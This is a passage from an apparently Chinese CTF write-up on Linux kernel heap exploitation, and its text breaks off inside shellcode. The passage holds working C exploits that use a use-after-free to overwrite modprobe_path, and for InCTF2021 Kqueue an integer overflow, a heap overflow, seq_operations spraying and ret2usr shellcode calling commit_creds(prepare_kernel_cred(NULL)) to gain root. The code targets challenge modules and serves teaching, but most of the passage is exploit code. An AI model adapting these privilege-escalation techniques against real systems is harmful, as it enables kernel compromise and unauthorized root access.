/flag&quot;</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span><br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">user_arg</span>&#123;<br>    <span class="hljs-type">size_t</span> *buffer;<br>    <span class="hljs-type">int</span> offset, size;<br>&#125;data;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">alloc_kernelmem</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x1111111</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">get_kernelmsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x7777777</span>, &amp;data);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">put_usermsg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd)</span></span>&#123;<br>    <span class="hljs-built_in">ioctl</span>(dev_fd, <span class="hljs-number">0x6666666</span>, &amp;data);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">5</span>];<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.size = <span class="hljs-number">0x50</span>;<br>    data.buffer = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">size_t</span> kernel_base, kernel_offset;<br>    <br>    <span class="hljs-type">int</span> fd = <span class="hljs-built_in">open</span>(HOME_PATH, O_RDWR|O_CREAT);<br>    <span class="hljs-built_in">write</span>(fd, userful_shell, <span class="hljs-built_in">sizeof</span>(userful_shell));<br>    <span class="hljs-built_in">close</span>(fd);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /home/flag.sh&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> page_offset_base;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)&#123;<br>        dev_fd[i] = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Step I:Construct the UAF obj...&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">memset</span>((<span class="hljs-type">char</span> *)data.buffer, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>);<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Step II:Leak the Kernel base&quot;</span>);<br>        <br>    <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    page_offset_base = data.buffer[<span class="hljs-number">0</span>]&amp;<span class="hljs-number">0xfffffffff0000000</span>;    <span class="hljs-comment">//KASLR 256MB*n</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get the Guessing page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br>    <span class="hljs-comment">/* Checking for the correction */</span><br>    data.buffer[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">3</span>]);<br>    <span class="hljs-built_in">get_kernelmsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span>((data.buffer[<span class="hljs-number">2</span>]&amp;<span class="hljs-number">0xfff</span>) != <span class="hljs-number">0x030</span>)&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unfortunatlly!We guess the page_offset_base failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    kernel_base = data.buffer[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Kernel_base :0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Kernel_offset :0x%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Step III:Arbitrary write the modprobe_path...&quot;</span>);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">close</span>(dev_fd[<span class="hljs-number">4</span>]);<br>    data.buffer[<span class="hljs-number">0</span>] = MODPROBE_PATH + kernel_offset - <span class="hljs-number">0x8</span>;<br>    <span class="hljs-comment">/**/</span><br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">alloc_kernelmem</span>(dev_fd[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;(data.buffer[<span class="hljs-number">1</span>]), <span class="hljs-string">&quot;/home/flag.sh&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]this is a debug...&quot;</span>);<br>    <span class="hljs-built_in">put_usermsg</span>(dev_fd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]Step IV:Handle the fake file...&quot;</span>);<br>    <br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h1 id="七、Kernel-Heap-Heap-Overflow"><a href="#七、Kernel-Heap-Heap-Overflow" class="headerlink" title="七、Kernel Heap - Heap Overflow"></a>七、Kernel Heap - Heap Overflow</h1><h2 id="例题：InCTF2021-Kqueue"><a href="#例题：InCTF2021-Kqueue" class="headerlink" title="例题：InCTF2021 - Kqueue"></a>例题：InCTF2021 - Kqueue</h2><p>据arttnab3师傅据Scupxa0s师傅说说这是印度的强网杯:dog:,改题目有个坑点那就是权限存在着问题，当拿到题目解压文件系统时我们需要以root用户的权限来进行解压跟打包，不然就会出现kernel init error</p>
<h3 id="1-题目逆向-4"><a href="#1-题目逆向-4" class="headerlink" title="1.题目逆向"></a>1.题目逆向</h3><p>题目运行脚本没开pti、smep、smap,所以我们可以采取ret2usr来做</p>
<p>首先分析漏洞模块，在这里大致分析一下，题目也是很贴心的给出了模块源码让我们分析</p>
<p>首先分析其中带的数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span>                                                    <br>    <span class="hljs-type">uint16_t</span> data_size;                                            <br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span> <br>    <span class="hljs-type">uint32_t</span> max_entries;                                          <br>    <span class="hljs-type">uint16_t</span> idx;                                                  <br>    <span class="hljs-type">char</span>* data;                                                    <br>&#125;<span class="hljs-built_in">queue</span>;                                                            <br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>&#123;</span>               <br>    <span class="hljs-type">uint16_t</span> idx;                 <br>    <span class="hljs-type">char</span> *data;                   <br>    queue_entry *next;            <br>&#125;;                                <br></code></pre></td></tr></table></figure>

<p>其中通过名称大致可以判别他们的功能</p>
<p>在源码当中显示他们的结构如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/83025aafa40f4bfb70218a67454f78f0f736180b.jpg" srcset="/img/loading.gif" lazyload></p>
<p>且在模块中可以看到存在一个全局变量 <code>kqueues[]</code>数组,他是一个 <code>queue *</code>类型的数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">                                           <br><span class="hljs-comment">/* 此乃哥们的传入参数 */</span>  <br>                                           <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span>                            <br>    <span class="hljs-type">uint32_t</span> max_entries;                  <br>    <span class="hljs-type">uint16_t</span> data_size;                    <br>    <span class="hljs-type">uint16_t</span> entry_idx;                    <br>    <span class="hljs-type">uint16_t</span> queue_idx;                    <br>    <span class="hljs-type">char</span>* data;                            <br>&#125;<span class="hljs-type">request_t</span>;                                <br><br></code></pre></td></tr></table></figure>

<p>大致数据结构分析完毕，接下来着手分析其中漏</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Now you have the option to safely preserve your precious kqueues */</span>                               <br><span class="hljs-type">static</span> noinline <span class="hljs-type">long</span> <span class="hljs-title function_">save_kqueue_entries</span><span class="hljs-params">(<span class="hljs-type">request_t</span> request)</span>&#123;                                         <br>                                                                                                     <br>	...                                                        <br>                       <br>                                                                                                     <br>    <span class="hljs-comment">/* copy all possible kqueue entries */</span>                                                           <br>    <span class="hljs-type">uint32_t</span> i=<span class="hljs-number">0</span>;                                                                                    <br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;request.max_entries+<span class="hljs-number">1</span>;i++)&#123;                                                            <br>        <span class="hljs-keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)                                                     <br>            <span class="hljs-keyword">break</span>;                                                                                   <br>        <span class="hljs-keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)                                                  <br>            validate(<span class="hljs-built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));   <span class="hljs-comment">//vulnuribility      </span><br>        <span class="hljs-keyword">else</span>                                                                                         <br>            err(<span class="hljs-string">&quot;[-] Internal error&quot;</span>);                                                               <br>        kqueue_entry = kqueue_entry-&gt;next;                                                           <br>        new_queue += <span class="hljs-built_in">queue</span>-&gt;data_size;                                                               <br>    &#125;                                                                                                <br>                                                                                                     <br>    <span class="hljs-comment">/* Mark the queue as saved */</span>                                                                    <br>    isSaved[request.queue_idx] = <span class="hljs-literal">true</span>;                                                               <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                                                                        <br>&#125;                                                                                                    <br><br></code></pre></td></tr></table></figure>

<p>漏洞点出现在 <code>save_kqueue_entries</code>函数当中，在复制内容到new_queue的过程当中,这里并没有使用到它自身 <code>queue-&gt;data_size</code> ，我们可以任意输入 <code>request.data_size</code>来造成 <code>kernel heap overflow</code>，初步我们可以考虑堆喷一定的结构体来进行指针覆盖，</p>
<p>这里可以尝试使用msg_msg + seq_operations 来泄露内核地址,下面是初步的漏洞利用猜想，刚好借用了 <code>CVE-2022-0185</code>当中的思想：</p>
<ol>
<li>首先堆喷一定的msg_msg,这里务必分配内容要为 <code>0x1000 + sizeof(struct seq_operations) - sizeof(struct msg) - sizeof(struct msgseg)</code>,堆喷该特定的大小是为了下一步堆喷seq_operations做准备</li>
<li>分配特定大小的 <code>kqueue</code>,务必使得他能跟msg_msg分配的来源一致，例如都从 <code>kmalloc-1k</code>当中分配，这样就有几率使得我们的kqueue紧贴着堆喷到的某一个msg_msg结构体上</li>
<li>假设我们成功使他们相邻，我们就可以利用堆溢出来修改 <code>msg_msg-&gt;m_ts</code>，将其改大，然后我们尝试使用msg_rcv来读一下其中数据，如果说大于我们之前分配的值，那就说明该msg_msg就是 <code>victim msg_msg</code></li>
<li>找到 <code>victim msg_msg</code>后，我们就可以利用其中的越界读了，此时我们可以再次大量堆喷 <code>struct seq_operations</code>，然后越界读其中的函数指针地址完成泄露</li>
<li>由于题目内核版本为5.8.1，因此仍可以采用userfaultfd,所以这里可以在send msg的过程中，当函数加载到 <code>load_msg</code>，可以利用条件竞争修改其中的next指针，使其完成任意写，这里可以写 <code>modprobe_path</code></li>
</ol>
<p>但是看了其他师傅的wp我发现我就是个:black_joker: :(</p>
<p>这里题目实际上还给了一个漏洞的利用，那就是整形的溢出，在我们创建queue结构体的时候，并没有对传入的<code>request.max_entries</code>进行检测,此时如果我们创建queue传入<code>max_entries参数</code>为<code>0xffffffff</code>,这里的 <code>space</code>字段就变成了0</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">__builtin_umulll_overflow</span>(<span class="hljs-name">sizeof</span>(<span class="hljs-name">queue_entry</span>),(<span class="hljs-name">request</span>.max_entries+1),<span class="hljs-symbol">&amp;space</span>) == true)<br>    err(<span class="hljs-string">&quot;[-] Integer overflow&quot;</span>)<span class="hljs-comment">;                                                         </span><br></code></pre></td></tr></table></figure>

<p>所以最终分配给queue的空间就只有 <code>sizeof(struct queue)</code>，为0x20大小，因此可以想到使用 <code>seq_operations</code>结构体来进行利用</p>
<h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p>整体流程十分简洁</p>
<ol>
<li>首先是利用第一个点，我们在创建queue的时候传入 <code>0xffffffff</code>，这样最终可以创建一个只有queue的队列而不包含其中的 <code>queue_entry</code></li>
<li>然后我们分配的data大小分配的是用来存放我们的shellcode指针的</li>
<li>我们此时利用第二个点那就是 <code>save_kqueue_entries</code>函数的堆溢出， 而由于我们的queue_size只有一个 <code>struct queue</code>结构体，而他的大小为0x20，因此我们大量堆喷 <code>seq_operations</code>结构体来构造相邻情况</li>
<li>此时当我们堆喷了大量的 <code>seq_operations</code>结构体后，假设刚好堆喷到了 <code>new_queue</code>的下一个结构体（实际上这有着极大概率出现该情况），此时我们就可以利用其中的堆溢出来将 <code>seq_operations-&gt;start</code>函数覆盖为我们的shellcode，然后下次读该 <code>seq_operations</code>所对应的fd指针时将会调用他</li>
<li>而由于有KASLR，我们还需要泄露出内核基地址，此时我们可以利用userland的pwn手法，也就是在栈上面寻找合适的地址，事实上我们也确实找到了一个稳定的内核地址，因此我们自己撰写shellcode然后调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>即可</li>
</ol>
<p>而题目中有个大坑，那就是在我开启的虚拟环境当中，正常最后调用 <code>system(&quot;/bin/sh&quot;)</code>会出现报错，起初是因为堆栈不平衡我倒是理解，但是之后我调整堆栈还是不行，在尝试的过程当中我发现他的终端是 <code>-sh</code>,这里不太明白，</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d228a420da7002309f79052d2c8.jpg" srcset="/img/loading.gif" lazyload></p>
<p>图中可以看到我们确实重启了一个新的终端，并且既然运行到这里也说明它通过了我uid的检查，确实属于root用户，但是仍然不能查看其中的flag，感觉可能是他的文件系统init脚本中配置的问题（下面），可惜看到后面没看出甚么名堂，还是太菜了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># use the /dev/console device node from devtmpfs if possible to not      </span><br><span class="hljs-comment"># confuse glibc&#x27;s ttyname_r().                                           </span><br><span class="hljs-comment"># This may fail (E.G. booted with console=), and errors from exec will   </span><br><span class="hljs-comment"># terminate the shell, so use a subshell for the test                    </span><br><span class="hljs-keyword">if</span> (exec <span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/dev/</span>console) <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>null; then                               <br>    exec <span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/dev/</span>console                                                  <br>    exec <span class="hljs-number">1</span>&gt;<span class="hljs-regexp">/dev/</span>console                                                  <br>    exec <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span>console                                                  <br>fi                                                                       <br></code></pre></td></tr></table></figure>

<p>最后直接取了个巧没有进行权限提升，直接打印的flag，如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/10dfa9ec8a136327dacdda00d78fa0ec08fac7e5.jpg" srcset="/img/loading.gif" lazyload></p>
<p>题目exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue</span>&#123;</span><br>    <span class="hljs-type">uint16_t</span> data_size;                                            <br>    <span class="hljs-type">uint64_t</span> queue_size; <span class="hljs-comment">/* This needs to handle larger numbers */</span> <br>    <span class="hljs-type">uint32_t</span> max_entries;                                          <br>    <span class="hljs-type">uint16_t</span> idx;                                                  <br>    <span class="hljs-type">char</span>* data;                                                    <br><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SAVE          0xB105BABE</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> root_shell;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())&#123;<br>        error_log(<span class="hljs-string">&quot;Failed to get root shell...&quot;</span>);<br>    &#125;<br>    info_log(<span class="hljs-string">&quot;I will get root shell...&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;You got my shell :)&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> maxentries, <span class="hljs-type">uint16_t</span> datasize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .max_entries = maxentries,<br>        .data_size = datasize,<br>    &#125;;<br>    ioctl(dev_fd, CREATE_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx, <span class="hljs-type">uint16_t</span> entry_idx, <span class="hljs-type">char</span> *data)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data = data,<br>    &#125;;<br>    ioctl(dev_fd, EDIT_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> idx)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = idx,<br>    &#125;;<br>    ioctl(dev_fd, DELETE_KQUEUE, &amp;request);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_kqueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> idx, <span class="hljs-type">uint32_t</span> maxentries, <span class="hljs-type">uint16_t</span> datasize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_request</span> <span class="hljs-title">request</span> =</span> &#123;<br>        .queue_idx = idx,<br>        .max_entries = maxentries,<br>        .data_size = datasize,<br>    &#125;;<br>    ioctl(dev_fd, SAVE, &amp;request);<br>&#125;<br><br><span class="hljs-type">size_t</span> middle_rsp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">()</span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r14, [rsp + 0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r14, 0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13, r14;&quot;</span><br>        <span class="hljs-string">&quot;add r13, 0x8c580;&quot;</span><br>        <span 